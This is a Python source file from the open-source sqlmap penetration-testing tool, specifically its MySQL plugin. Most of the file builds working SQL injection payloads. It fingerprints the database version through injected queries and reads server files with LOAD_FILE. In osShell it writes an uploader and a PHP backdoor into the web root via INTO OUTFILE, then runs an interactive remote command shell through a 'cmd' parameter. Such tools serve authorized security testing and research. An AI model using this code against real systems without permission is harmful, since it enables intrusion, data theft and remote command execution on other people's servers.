#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2006-2008 Bernardo Damele A. G. <bernardo.damele@gmail.com>
                        and Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



import re

from lib.core.agent import agent
from lib.core.common import fileToStr
from lib.core.common import formatDBMSfp
from lib.core.common import formatOSfp
from lib.core.common import getDirectories
from lib.core.common import getHtmlErrorFp
from lib.core.common import randomInt
from lib.core.common import readInput
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import paths
from lib.core.exception import sqlmapSyntaxException
from lib.core.session import setDbms
from lib.core.settings import MYSQL_ALIASES
from lib.core.settings import MYSQL_SYSTEM_DBS
from lib.core.shell import autoCompletion
from lib.core.unescaper import unescaper
from lib.parse.banner import bannerParser
from lib.request import inject
from lib.request.connect import Connect as Request
#from lib.utils.fuzzer import passiveFuzzing

from plugins.generic.enumeration import Enumeration
from plugins.generic.filesystem import Filesystem
from plugins.generic.fingerprint import Fingerprint
from plugins.generic.takeover import Takeover


class MySQLMap(Fingerprint, Enumeration, Filesystem, Takeover):
    """
    This class defines MySQL methods
    """

    def __init__(self):
        self.excludeDbsList = MYSQL_SYSTEM_DBS
        Enumeration.__init__(self, "MySQL")

        unescaper.setUnescape(MySQLMap.unescape)


    @staticmethod
    def unescape(expression, quote=True):
        if quote:
            while True:
                index = expression.find("'")
                if index == -1:
                    break

                firstIndex = index + 1
                index = expression[firstIndex:].find("'")

                if index == -1:
                    raise sqlmapSyntaxException, "Unenclosed ' in '%s'" % expression

                lastIndex = firstIndex + index
                old = "'%s'" % expression[firstIndex:lastIndex]
                unescaped = ""

                for i in range(firstIndex, lastIndex):
                    unescaped += "%d" % (ord(expression[i]))
                    if i < lastIndex - 1:
                        unescaped += ","

                expression = expression.replace(old, "CHAR(%s)" % unescaped)
        else:
            unescaped  = "CHAR("
            unescaped += ",".join("%d" % ord(c) for c in expression)
            unescaped += ")"

            expression = unescaped

        return expression


    @staticmethod
    def escape(expression):
        while True:
            index = expression.find("CHAR(")
            if index == -1:
                break

            firstIndex = index
            index = expression[firstIndex:].find(")")

            if index == -1:
                raise sqlmapSyntaxException, "Unenclosed ) in '%s'" % expression

            lastIndex = firstIndex + index + 1
            old = expression[firstIndex:lastIndex]
            oldUpper = old.upper()
            oldUpper = oldUpper.lstrip("CHAR(").rstrip(")")
            oldUpper = oldUpper.split(",")

            escaped = "'%s'" % "".join([chr(int(char)) for char in oldUpper])
            expression = expression.replace(old, escaped)

        return expression


    def __commentCheck(self):
        logMsg = "executing MySQL comment injection fingerprint"
        logger.info(logMsg)

        query   = agent.prefixQuery(" /* NoValue */")
        query   = agent.postfixQuery(query)
        payload = agent.payload(newValue=query)
        result  = Request.queryPage(payload)

        if result != kb.defaultResult:
            warnMsg = "unable to perform MySQL comment injection"
            logger.warn(warnMsg)

            return None

        # MySQL valid versions updated at 10/2008
        versions = (
                     (32200, 32233),    # MySQL 3.22
                     (32300, 32354),    # MySQL 3.23
                     (40000, 40024),    # MySQL 4.0
                     (40100, 40122),    # MySQL 4.1
                     (50000, 50072),    # MySQL 5.0
                     (50100, 50129),    # MySQL 5.1
                     (60000, 60008),    # MySQL 6.0
                   )

        for element in versions:
            prevVer = None

            for version in range(element[0], element[1] + 1):
                randInt = randomInt()
                version = str(version)
                query   = agent.prefixQuery(" /*!%s AND %d=%d*/" % (version, randInt, randInt + 1))
                query   = agent.postfixQuery(query)
                payload = agent.payload(newValue=query)
                result  = Request.queryPage(payload)

                if result == kb.defaultResult:
                    if not prevVer:
                        prevVer = version

                    if version[0] == "3":
                        midVer = prevVer[1:3]
                    else:
                        midVer = prevVer[2]

                    trueVer = "%s.%s.%s" % (prevVer[0], midVer, prevVer[3:])

                    return trueVer

                prevVer = version

        return None


    def getFingerprint(self):
        actVer = formatDBMSfp()

        if not conf.extensiveFp:
            return actVer

        comVer     = self.__commentCheck()
        blank      = " " * 16
        formatInfo = None
        value      = "active fingerprint: %s" % actVer

        if comVer:
            comVer = formatDBMSfp([comVer])
            value += "\n%scomment injection fingerprint: %s" % (blank, comVer)

        if self.banner:
            info       = bannerParser(self.banner)
            formatInfo = formatOSfp(info)

            banVer = info['version']
            if re.search("-log$", self.banner):
                banVer += ", logging enabled"
            banVer = formatDBMSfp([banVer])
            value += "\n%sbanner parsing fingerprint: %s" % (blank, banVer)

        #passiveFuzzing()
        htmlParsed = getHtmlErrorFp()

        if htmlParsed:
            value += "\n%shtml error message fingerprint: %s" % (blank, htmlParsed)

        if formatInfo:
            value += "\n%s" % formatInfo

        return value


    def checkDbms(self):
        """
        References for fingerprint:

        * http://dev.mysql.com/doc/refman/5.0/en/news-5-0-x.html
        * http://dev.mysql.com/doc/refman/5.1/en/news-5-1-x.html
        * http://dev.mysql.com/doc/refman/6.0/en/news-6-0-x.html
        """

        if conf.dbms in MYSQL_ALIASES and kb.dbmsVersion and kb.dbmsVersion[0].isdigit():
            setDbms("MySQL %s" % kb.dbmsVersion[0])

            if int(kb.dbmsVersion[0]) >= 5:
                self.has_information_schema = True

            if not conf.extensiveFp:
                return True

        logMsg = "testing MySQL"
        logger.info(logMsg)

        randInt = str(randomInt(1))
        query = "CONCAT('%s', '%s')" % (randInt, randInt)

        if inject.getValue(query) == (randInt * 2):
            logMsg = "confirming MySQL"
            logger.info(logMsg)

            query = "LENGTH('%s')" % randInt

            if not inject.getValue(query) == "1":
                warnMsg = "the back-end DMBS is not MySQL"
                logger.warn(warnMsg)

                return False

            # Determine if it is MySQL >= 5.0.0
            if inject.getValue("SELECT %s FROM information_schema.TABLES LIMIT 0, 1" % randInt) == randInt:
                setDbms("MySQL 5")
                self.has_information_schema = True

                if not conf.extensiveFp:
                    kb.dbmsVersion = [">= 5.0.0"]
                    return True

                # Check if it is MySQL >= 6.0.3
                if inject.getValue("SELECT %s FROM information_schema.PARAMETERS LIMIT 0, 1" % randInt) == randInt:
                    if inject.getValue("SELECT %s FROM information_schema.PROFILING LIMIT 0, 1" % randInt) == randInt:
                        kb.dbmsVersion = [">= 6.0.5"]
                    else:
                        kb.dbmsVersion = [">= 6.0.3", "< 6.0.5"]

                # Or if it MySQL >= 5.1.2 and < 6.0.3
                elif inject.getValue("MID(@@plugin_dir, 1, 1)"):
                    if inject.getValue("SELECT %s FROM information_schema.PROFILING LIMIT 0, 1" % randInt) == randInt:
                        kb.dbmsVersion = [">= 5.1.28", "< 6.0.3"]
                    elif inject.getValue("MID(@@innodb_stats_on_metadata, 1, 1)"):
                        kb.dbmsVersion = [">= 5.1.17", "< 5.1.28"]
                    elif inject.getValue("SELECT %s FROM information_schema.REFERENTIAL_CONSTRAINTS LIMIT 0, 1" % randInt) == randInt:
                        kb.dbmsVersion = [">= 5.1.10", "< 5.1.17"]
                    elif inject.getValue("SELECT %s FROM information_schema.PROCESSLIST LIMIT 0, 1" % randInt) == randInt:
                        kb.dbmsVersion = [">= 5.1.7", "< 5.1.10"]
                    elif inject.getValue("SELECT %s FROM information_schema.PARTITIONS LIMIT 0, 1" % randInt) == randInt:
                        kb.dbmsVersion = ["= 5.1.6"]
                    elif inject.getValue("SELECT %s FROM information_schema.PLUGINS LIMIT 0, 1" % randInt) == randInt:
                        kb.dbmsVersion = [">= 5.1.5", "< 5.1.6"]
                    elif inject.getValue("MID(@@table_open_cache, 1, 1)"):
                        kb.dbmsVersion = [">= 5.1.3", "< 5.1.5"]
                    else:
                        kb.dbmsVersion = ["= 5.1.2"]

                # Or if it is MySQL >= 5.0.0 and < 5.1.2
                elif inject.getValue("MID(@@hostname, 1, 1)"):
                    kb.dbmsVersion = [">= 5.0.38", "< 5.1.2"]
                elif inject.getValue("SELECT 1 FROM DUAL") == "1":
                    kb.dbmsVersion = [">= 5.0.11", "< 5.0.38"]
                elif inject.getValue("DATABASE() LIKE SCHEMA()"):
                    kb.dbmsVersion = [">= 5.0.2", "< 5.0.11"]
                else:
                    kb.dbmsVersion = [">= 5.0.0", "<= 5.0.1"]

            # Otherwise assume it is MySQL < 5.0.0
            else:
                setDbms("MySQL 4")
                kb.dbmsVersion = ["< 5.0.0"]

                if not conf.extensiveFp:
                    return True

                # Check which version of MySQL < 5.0.0 it is
                coercibility = inject.getValue("COERCIBILITY(USER())")

                if coercibility == "3":
                    kb.dbmsVersion = [">= 4.1.11", "< 5.0.0"]
                elif coercibility == "2":
                    kb.dbmsVersion = [">= 4.1.1", "< 4.1.11"]
                elif inject.getValue("CURRENT_USER()"):
                    kb.dbmsVersion = [">= 4.0.6", "< 4.1.1"]

                    if inject.getValue("CHARSET(CURRENT_USER())") == "utf8":
                        kb.dbmsVersion = ["= 4.1.0"]
                    else:
                        kb.dbmsVersion = [">= 4.0.6", "< 4.1.0"]
                elif inject.getValue("FOUND_ROWS()") == "0":
                    kb.dbmsVersion = [">= 4.0.0", "< 4.0.6"]
                elif inject.getValue("CONNECTION_ID()"):
                    kb.dbmsVersion = [">= 3.23.14", "< 4.0.0"]
                elif re.search("@[\w\.\-\_]+", inject.getValue("USER()")):
                    kb.dbmsVersion = [">= 3.22.11", "< 3.23.14"]
                else:
                    kb.dbmsVersion = ["< 3.22.11"]

            if conf.getBanner:
                self.banner = inject.getValue("VERSION()")

            return True
        else:
            warnMsg = "the back-end DMBS is not MySQL"
            logger.warn(warnMsg)

            return False


    def readFile(self, rFile):
        logMsg = "fetching file: '%s'" % rFile
        logger.info(logMsg)

        return inject.getValue("LOAD_FILE('%s')" % rFile)


    def osShell(self):
        """
        This method is used to write a PHP agent (cmd.php) on a writable
        remote directory within the web server document root.
        Such agent is written using the INTO OUTFILE MySQL DBMS
        functionality

        @todo: * Add a web application crawling functionality to detect
               all (at least most) web server directories and merge with
               Google results if the target host is a publicly available
               hostname or IP address;
               * Extend to all DBMS using their functionalities (UDF, stored
               procedures, etc) to write files on the system or directly
               execute commands on the system without passing by the agent;
               * Automatically detect the web server available interpreters
               parsing 'Server', 'X-Powered-By' and 'X-AspNet-Version' HTTP
               response headers;
               * Extend the agent to other interpreters rather than only PHP:
               ASP, JSP, CGI (Python, Perl, Ruby, Bash).
        """

        logMsg  = "retrieving web application directories"
        logger.info(logMsg)

        directories = getDirectories()

        if directories:
            logMsg  = "retrieved web server directories "
            logMsg += "'%s'" % ", ".join(d for d in directories)
            logger.info(logMsg)

            message  = "in addition you can provide a list of directories "
            message += "absolute path comma separated that you want sqlmap "
            message += "to try to upload the agent [/var/www/test]: "
            inputDirs = readInput(message, default="/var/www/test")
        else:
            message = "please provide the web server document root [/var/www]: "
            inputDocRoot = readInput(message, default="/var/www")

            if inputDocRoot:
                kb.docRoot = inputDocRoot
            else:
                kb.docRoot = "/var/www"

            message  = "please provide a list of directories absolute path "
            message += "comma separated that you want sqlmap to try to "
            message += "upload the agent [/var/www/test]: "
            inputDirs = readInput(message, default="/var/www/test")

        if inputDirs:
            inputDirs = inputDirs.replace(", ", ",")
            inputDirs = inputDirs.split(",")

            for inputDir in inputDirs:
                directories.add(inputDir)
        else:
            directories.add("/var/www/test")

        logMsg  = "trying to upload the uploader agent"
        logger.info(logMsg)

        directories = list(directories)
        directories.sort()
        uploaded = False

        backdoorName = "backdoor.php"
        backdoorPath = "%s/%s" % (paths.SQLMAP_SHELL_PATH, backdoorName)
        uploaderName = "uploader.php"
        uploaderStr  = fileToStr("%s/%s" % (paths.SQLMAP_SHELL_PATH, uploaderName))

        for directory in directories:
            if uploaded:
                break

            # Upload the uploader agent
            uploaderQuery = uploaderStr.replace("WRITABLE_DIR", directory)
            query  = " LIMIT 1 INTO OUTFILE '%s/%s' " % (directory, uploaderName)
            query += "LINES TERMINATED BY '\\n%s\\n'--" % uploaderQuery

            query = agent.prefixQuery(" %s" % query)
            query = agent.postfixQuery(query)

            payload = agent.payload(newValue=query)
            page = Request.queryPage(payload)

            if kb.docRoot:
                requestDir = directory.replace(kb.docRoot, "")
            else:
                requestDir = directory

            baseUrl = "%s://%s:%d%s" % (conf.scheme, conf.hostname, conf.port, requestDir)
            uploaderUrl = "%s/%s" % (baseUrl, uploaderName)
            page = Request.getPage(url=uploaderUrl, direct=True)

            if "sqlmap backdoor uploader" not in page:
                warnMsg  = "unable to upload the uploader "
                warnMsg += "agent on '%s'" % directory
                logger.warn(warnMsg)

                continue

            logMsg  = "the uploader agent has been successfully uploaded "
            logMsg += "on '%s'" % directory
            logger.info(logMsg)

            # Upload the backdoor through the uploader agent
            multipartParams = {
                                "upload":    "1",
                                "file":      open(backdoorPath, "r"),
                                "uploadDir": directory,
                              }
            uploaderUrl = "%s/%s" % (baseUrl, uploaderName)
            page = Request.getPage(url=uploaderUrl, multipart=multipartParams)

            if "Backdoor uploaded" not in page:
                warnMsg  = "unable to upload the backdoor through "
                warnMsg += "the uploader agent on '%s'" % directory
                logger.warn(warnMsg)

                continue

            uploaded = True

            backdoorUrl = "%s/%s" % (baseUrl, backdoorName)
            logMsg  = "the backdoor has been successfully uploaded on "
            logMsg += "'%s', go with your browser to " % directory
            logMsg += "'%s' and enjoy it!" % backdoorUrl
            logger.info(logMsg)

            message  = "do you want to use the uploaded backdoor as a "
            message += "shell to execute commands right now? [Y/n] "
            shell = readInput(message, default="Y")

            if shell in ("n", "N"):
                continue

            logMsg  = "calling OS shell. To quit type "
            logMsg += "'x' or 'q' and press ENTER"
            logger.info(logMsg)

            autoCompletion(osShell=True)

            while True:
                command = None

                try:
                    command = raw_input("$ ")
                except KeyboardInterrupt:
                    print
                    errMsg = "user aborted"
                    logger.error(errMsg)
                except EOFError:
                    print
                    errMsg = "exit"
                    logger.error(errMsg)
                    break

                if not command:
                    continue

                if command.lower() in ( "x", "q", "exit", "quit" ):
                    break

                cmdUrl = "%s?cmd=%s" % (backdoorUrl, command)
                page = Request.getPage(url=cmdUrl, direct=True)
                output = re.search("<pre>(.+?)</pre>", page, re.I | re.S)

                if output:
                    print output.group(1)
                else:
                    print "No output"
